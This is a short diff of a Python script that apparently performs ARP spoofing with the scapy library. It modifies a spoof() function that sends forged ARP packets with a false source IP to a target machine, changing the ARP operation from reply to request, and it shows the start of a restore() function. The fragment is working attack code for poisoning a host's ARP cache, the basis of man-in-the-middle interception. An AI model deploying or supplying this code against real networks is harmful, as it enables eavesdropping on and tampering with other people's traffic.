@@ -137,8 +137,8 @@ def get_network_cidr() -> str:
 
 def spoof(target_ip: str, spoof_ip: str, target_mac: str):
     """Sends a single spoofed ARP response to the target."""
-    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    packet = scapy.Ether(dst=target_mac) / arp_response
+    arp_packet = scapy.ARP(op=1, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    packet = scapy.Ether(dst=target_mac) / arp_packet
     scapy.sendp(packet, verbose=False)
 
 def restore(destination_ip: str, source_ip: str, destination_mac: str, source_mac: str):
